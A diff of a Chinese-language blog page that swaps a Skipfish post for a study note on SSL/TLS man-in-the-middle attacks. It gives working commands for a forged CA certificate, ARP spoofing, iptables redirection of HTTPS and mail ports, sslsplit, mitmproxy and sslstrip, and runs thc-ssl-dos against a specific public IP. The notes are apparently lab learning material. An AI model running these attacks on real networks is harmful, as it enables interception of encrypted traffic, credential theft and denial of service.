@@ -79,16 +79,18 @@
 
 
 
-<meta name="description" content="1. skipfish C语言编写（Google开发） 实验性的主动web安全评估工具（相比于商业扫描器不遑相让） 基于Web Application进行扫描 递归爬网 基于字典的探测 速度较快 多路单线程，全异步网络I&#x2F;O，消除内存管理和调度开销 启发式自动内容识别   误报较低  2. skipfish 🔺命令：skipfish -o（存放工作目录） test http:&#x2F;&#x2F;1.1.1.1">
+<meta name="description" content="1. 中间人攻击 攻击者位于客户端和服务器通信链路中 ARP（欺骗局域网内所有主机，误认中间人为网关） DHCP（若中间人物理连接距离小于DHCP服务器，中间人可开放DHCP服务） 修改网关（理论上可行，实际上几乎不存在） 修改DNS（设置DNS解析到中间人的服务上） 修改HOSTS（本地域名解析文件，优先级高于网卡的DNS服务器） ICMP、STP、OSPF（ICMP的重定向、STP生成树协议">
 <meta name="keywords" content="安全">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Kali Linux笔记(三十九)：Skipfish">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;27&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E4%B9%9D)%EF%BC%9ASkipfish&#x2F;index.html">
+<meta property="og:title" content="Kali Linux笔记(五十六)：SSL、TLS中间人攻击--伪造证书">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;01&#x2F;24&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%85%AD)%EF%BC%9ASSL%E3%80%81TLS%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB--%E4%BC%AA%E9%80%A0%E8%AF%81%E4%B9%A6&#x2F;index.html">
 <meta property="og:site_name" content="Tomas&#39;Blog">
-<meta property="og:description" content="1. skipfish C语言编写（Google开发） 实验性的主动web安全评估工具（相比于商业扫描器不遑相让） 基于Web Application进行扫描 递归爬网 基于字典的探测 速度较快 多路单线程，全异步网络I&#x2F;O，消除内存管理和调度开销 启发式自动内容识别   误报较低  2. skipfish 🔺命令：skipfish -o（存放工作目录） test http:&#x2F;&#x2F;1.1.1.1">
+<meta property="og:description" content="1. 中间人攻击 攻击者位于客户端和服务器通信链路中 ARP（欺骗局域网内所有主机，误认中间人为网关） DHCP（若中间人物理连接距离小于DHCP服务器，中间人可开放DHCP服务） 修改网关（理论上可行，实际上几乎不存在） 修改DNS（设置DNS解析到中间人的服务上） 修改HOSTS（本地域名解析文件，优先级高于网卡的DNS服务器） ICMP、STP、OSPF（ICMP的重定向、STP生成树协议">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2020-01-05T02:46:55.222Z">
+<meta property="og:image" content="http:&#x2F;&#x2F;www.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=cd17jyxDRF09k8RBXC_RZE6TM74bLDooASryP01CbUNmIirmBN4FVZpWUv9zfFoVS4IJoCSpamScRHoQdctaV3hTYvbBDRvSLdspCZLctOJZx6mVEWxAQe3CXbvevSCX&amp;file_name=&#x2F;%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB.PNG">
+<meta property="og:updated_time" content="2020-01-24T00:31:33.425Z">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;www.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=cd17jyxDRF09k8RBXC_RZE6TM74bLDooASryP01CbUNmIirmBN4FVZpWUv9zfFoVS4IJoCSpamScRHoQdctaV3hTYvbBDRvSLdspCZLctOJZx6mVEWxAQe3CXbvevSCX&amp;file_name=&#x2F;%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB.PNG">
 
 
 
@@ -118,13 +120,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/12/27/Kali Linux笔记(三十九)：Skipfish/"/>
+  <link rel="canonical" href="http://yoursite.com/2020/01/24/Kali Linux笔记(五十六)：SSL、TLS中间人攻击--伪造证书/"/>
 
 
 
 
 
-  <title>Kali Linux笔记(三十九)：Skipfish | Tomas'Blog</title>
+  <title>Kali Linux笔记(五十六)：SSL、TLS中间人攻击--伪造证书 | Tomas'Blog</title>
   
 
 
@@ -243,7 +245,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E4%B9%9D)%EF%BC%9ASkipfish/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%85%AD)%EF%BC%9ASSL%E3%80%81TLS%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB--%E4%BC%AA%E9%80%A0%E8%AF%81%E4%B9%A6/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Tomas">
@@ -260,7 +262,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Kali Linux笔记(三十九)：Skipfish</h1>
+          <h1 class="post-title" itemprop="name headline">Kali Linux笔记(五十六)：SSL、TLS中间人攻击--伪造证书</h1>
         
 
         <div class="post-meta">
@@ -272,8 +274,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-27T10:59:15+08:00">
-                2019-12-27
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-24T08:34:49+08:00">
+                2020-01-24
               </time>
             
 
@@ -333,57 +335,123 @@
 
       
         <hr>
-<h4 id="1-skipfish"><a href="#1-skipfish" class="headerlink" title="1. skipfish"></a>1. skipfish</h4><ul>
-<li>C语言编写（Google开发）</li>
-<li>实验性的主动web安全评估工具（相比于商业扫描器不遑相让）</li>
-<li>基于Web Application进行扫描</li>
-<li>递归爬网</li>
-<li>基于字典的探测</li>
-<li>速度较快<ul>
-<li>多路单线程，全异步网络I/O，消除内存管理和调度开销</li>
-<li>启发式自动内容识别</li>
-</ul>
-</li>
-<li>误报较低</li>
-</ul>
-<h4 id="2-skipfish"><a href="#2-skipfish" class="headerlink" title="2. skipfish"></a>2. skipfish</h4><ul>
-<li><strong><code>🔺命令：skipfish -o（存放工作目录） test http://1.1.1.1</code></strong></li>
-<li><strong><code>🔺命令：skipfish -o test @url.txt</code></strong></li>
-<li><strong><code>🔺命令：skipfish -o test -S（指定只读字典）complet.wl -W（写成新的字典） a.wl http://1.1.1.1  #字典</code></strong></li>
-<li>参数<ul>
-<li>-I：只检查包含’string’的URL</li>
-<li>-X：不检查包含’string’的URL  #logout</li>
-<li>-K：不对指定参数进行Fuzz测试</li>
-<li>-D：跨站点爬取另外一个域（有连接则会跳过去爬取 ）</li>
-<li>-l：每秒最大请求数</li>
-<li>-m：每IP最大并发连接数</li>
-<li>–config：指定配置文件</li>
-</ul>
-</li>
-<li>身份认证（http认证）<ul>
-<li><strong><code>🔺命令：skipfish -A（http身份认证信息） user:pass -o test http://1.1.1.1</code></strong></li>
-</ul>
-</li>
-<li>身份认证（Cookie认证）    <ul>
-<li><strong><code>🔺命令：skipfish -C（Cookie信息）&quot;name=var&quot; -o test http://1.1.1.1</code></strong></li>
-</ul>
-</li>
-<li>身份认证参数（表单认证） <ul>
-<li>–auth-form <URL> </li>
-<li>–auth-user-field &lt;表单代码名&gt; （通过form里面的代码名）</li>
-<li>–auth-user <username> （提交表单的用户名）</li>
-<li>–auth-pass-field &lt;表单代码名&gt; （通过form里面的代码名）</li>
-<li>–auth-pass <password>  （提交表单的密码）</li>
-<li>–auth-verify-url <URL> （提交成功后显示的界面）</li>
-<li>–auth-form-target <URL>（通过form里面的action确定）</li>
+<h4 id="1-中间人攻击"><a href="#1-中间人攻击" class="headerlink" title="1. 中间人攻击"></a>1. 中间人攻击</h4><ul>
+<li>攻击者位于客户端和服务器通信链路中<ul>
+<li>ARP（欺骗局域网内所有主机，误认中间人为网关）</li>
+<li>DHCP（若中间人物理连接距离小于DHCP服务器，中间人可开放DHCP服务）</li>
+<li>修改网关（理论上可行，实际上几乎不存在）</li>
+<li>修改DNS（设置DNS解析到中间人的服务上）</li>
+<li>修改HOSTS（本地域名解析文件，优先级高于网卡的DNS服务器）</li>
+<li>ICMP、STP、OSPF（ICMP的重定向、STP生成树协议、OSPF路由协议）</li>
 </ul>
 </li>
 </ul>
 <blockquote>
-<pre><code>表单代码名可通过查看界面源代码元素去获得，查看表单设置的属性</code></pre></blockquote>
+<pre><code>⭐STP:生成树协议
+1.多个核心层交换机的多线连接，容易形成环路
+2.多个核心层交换机的冗杂备份
+▲ 交换机物理上的环路，通过生成树协议控制，实现逻辑上的无环路</code></pre></blockquote>
+<p><img src="http://www.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=cd17jyxDRF09k8RBXC_RZE6TM74bLDooASryP01CbUNmIirmBN4FVZpWUv9zfFoVS4IJoCSpamScRHoQdctaV3hTYvbBDRvSLdspCZLctOJZx6mVEWxAQe3CXbvevSCX&file_name=/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB.PNG" alt="中间人攻击"></p>
 <ul>
-<li>扫描结束太快<ul>
-<li>触发了目标站点的连接数限制，降低-m -l数值</li>
+<li>加密流量</li>
+<li>攻击的前提<ul>
+<li>客户端已经信任伪造证书颁发机构</li>
+<li>攻击者控制了核发证书颁发机构</li>
+<li>客户端程序禁止了显示证书错误告警信息</li>
+<li>攻击者已经控制客户端，并强制其信任伪造证书</li>
+</ul>
+</li>
+<li>▲ ARP地址欺骗是实现中间人攻击的因素之一</li>
+</ul>
+<h4 id="2-SSLsplit"><a href="#2-SSLsplit" class="headerlink" title="2. SSLsplit"></a>2. SSLsplit</h4><ul>
+<li>SSLsplit（调用Openssl）<ul>
+<li>透明SSL/TLS中间人攻击工具</li>
+<li>对客户端伪装成服务器，对服务器伪装成普通客户端</li>
+<li>伪装服务器需要伪造证书</li>
+<li>支持SSL/TLS加密的SMTP、POP3、FTP等通信中间人攻击</li>
+</ul>
+</li>
+<li>利用openssl生成证书私钥<ul>
+<li><strong><code>🔺命令：openssl genrsa -out ca.key 2048</code></strong></li>
+</ul>
+</li>
+<li>利用私钥签名生成证书<ul>
+<li><strong><code>🔺命令：openssl req -new -x509 -days（证书时间） 1096 -key ca.key -out ca.crt</code></strong></li>
+<li>填写相关信息：Country、Province、Locality Name、Organization、Organizational Name、FQDN Name、Email Address</li>
+</ul>
+</li>
+<li>启用路由（中间人）/proc/sys/net/ipv4/ip_forward<ul>
+<li><strong><code>🔺命令：sysctl -w net.ipv4.ip_forward=1</code></strong></li>
+</ul>
+</li>
+<li>iptables端口转发规则<ul>
+<li><strong><code>🔺命令：iptables -t nat -F</code></strong>（清空当前所有规则）</li>
+<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</code></strong> </li>
+<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443</code></strong></li>
+<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443</code></strong> #MSA </li>
+<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443</code></strong> #SMTPS </li>
+<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443</code></strong> #IMAPS </li>
+<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443</code></strong> #POP3S </li>
+<li><strong><code>🔺命令：iptables -t nat -L</code></strong>（查看添加的所有规则）</li>
+</ul>
+</li>
+<li>ARP欺骗<ul>
+<li>win7 → **`🔺命令：arp a（查看网关MAC地址）</li>
+<li>Kali → <strong><code>🔺命令：arpspoof -l eth0 -t 1.1.1.2（目标主机） -r 1.1.1.1（欺骗的网关）</code></strong>▲ 2020.1.23修改-l参数为-i</li>
+</ul>
+</li>
+<li>启动SSLsplit<ul>
+<li><strong><code>🔺命令：mkdir -p test/logdir</code></strong></li>
+<li><strong><code>🔺命令：sslsplit -D（debug模式）-l（连接信息记录） connect.log -j（&quot;越狱目录&quot;） /root/test -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8843 tcp 0.0.0.0 8080</code></strong></li>
+</ul>
+</li>
+<li>被害者访问taobao，baidu，mail.163.com ▲ 2020.1.23 win7自带证书已经无法访问这三个网站，这三个网站对证书的不支持</li>
+<li>查看日志和浏览器证书（connect.log，443.log，80.log）</li>
+<li>安装服务器根证书后再次访问 ▲ 2020.1.24在Win10系统上实验不成功<ul>
+<li>拷贝根证书到win7电脑上</li>
+<li>双击证书安装 → 受信任的根证书颁发机构</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>⭐taobao的官网，除了https加密之外，还对数据进行加密（比如密码控件）
+⭐全站https和非全站https的区别，非全站https是指对登陆的账户和密码使用https登陆
+⭐可以通过grep 12334 * 去查看要查看的信息（搜索日志文件）</code></pre></blockquote>
+<h4 id="3-Mitmproxy"><a href="#3-Mitmproxy" class="headerlink" title="3. Mitmproxy"></a>3. Mitmproxy</h4><ul>
+<li>▲ 同样需要arp地址欺骗来实现SSL中间人攻击</li>
+<li>▲ 自动集成生成一张证书（同SSLsplit的证书不同）</li>
+<li>Bug：http(80)/https(443)只能在8080端口侦听</li>
+<li>iptables端口转发规则<ul>
+<li><strong><code>🔺命令：iptables -t nat -F</code></strong></li>
+<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080</code></strong></li>
+<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080</code></strong></li>
+</ul>
+</li>
+<li>启动mitmproxy ▲ 2020.1.24在Win10系统上实验不成功<ul>
+<li><strong><code>🔺命令：mitmproxy -T --host -w mitmproxy.log</code></strong>（窗口记录流量）</li>
+<li>Tab 下一个信息/q 退出/也可以鼠标点击访问 </li>
+</ul>
+</li>
+</ul>
+<h4 id="4-SSLstrip"><a href="#4-SSLstrip" class="headerlink" title="4. SSLstrip"></a>4. SSLstrip</h4><ul>
+<li>▲ 同样需要arp地址欺骗来实现SSL中间人攻击</li>
+<li>与前两种工具不同，将客户端到中间人之间的流量变为明文</li>
+<li>自动生成sslstrip.log文件</li>
+<li><strong><code>🔺命令：sslstrip -l 8080</code></strong> ▲ 2020.1.24在Win10系统上实验不成功</li>
+</ul>
+<h4 id="5-SSL-TLS拒绝服务攻击"><a href="#5-SSL-TLS拒绝服务攻击" class="headerlink" title="5. SSL/TLS拒绝服务攻击"></a>5. SSL/TLS拒绝服务攻击</h4><ul>
+<li>thc-ssl-dos<ul>
+<li>SSL协商加密对性能开销增加，大量握手请求会导致拒绝服务</li>
+<li>利用SSL secure Renegotiation特性，在单一TCP连接中生成数千个SSL重连接请求，造成服务器资源过载</li>
+<li>与流量式拒绝服务攻击不同，thc-ssl-dos可以利用ADSL线路打垮30G带宽的服务器</li>
+<li>服务器平均可以处理300次/秒SSL握手请求</li>
+<li>对SMTPS、POP3等服务同样有效</li>
+<li><strong><code>🔺命令：thc-ssl-dos 199.223.209.205 2083 --accept</code></strong> ▲ 2020.1.23 Target has disabled renegotiations.</li>
+</ul>
+</li>
+<li>对策<ul>
+<li>禁用SSL-Renegotiation、使用SSL Accelerator</li>
+<li>通过修改thc-ssl-dos代码，可以绕过以上对策</li>
 </ul>
 </li>
 </ul>
@@ -417,8 +485,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/12/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E5%85%AB)%EF%BC%9AVega/" rel="next" title="Kali Linux笔记(三十八)：Vega">
-                <i class="fa fa-chevron-left"></i> Kali Linux笔记(三十八)：Vega
+              <a href="/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%BA%8C)%EF%BC%9AXSS/" rel="next" title="Kali Linux笔记(五十二)：XSS">
+                <i class="fa fa-chevron-left"></i> Kali Linux笔记(五十二)：XSS
               </a>
             
           </div>
@@ -426,10 +494,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/12/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E5%85%AD)%EF%BC%9AWeb%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E5%8F%8A%E5%B7%A5%E5%85%B7/" rel="prev" title="Kali Linux笔记(三十六)：Web渗透实验环境及工具">
-                Kali Linux笔记(三十六)：Web渗透实验环境及工具 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -599,7 +663,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-skipfish"><span class="nav-number">1.</span> <span class="nav-text">1. skipfish</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-skipfish"><span class="nav-number">2.</span> <span class="nav-text">2. skipfish</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-中间人攻击"><span class="nav-number">1.</span> <span class="nav-text">1. 中间人攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-SSLsplit"><span class="nav-number">2.</span> <span class="nav-text">2. SSLsplit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-Mitmproxy"><span class="nav-number">3.</span> <span class="nav-text">3. Mitmproxy</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-SSLstrip"><span class="nav-number">4.</span> <span class="nav-text">4. SSLstrip</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-SSL-TLS拒绝服务攻击"><span class="nav-number">5.</span> <span class="nav-text">5. SSL/TLS拒绝服务攻击</span></a></li></ol></div>
             
 
           </div>
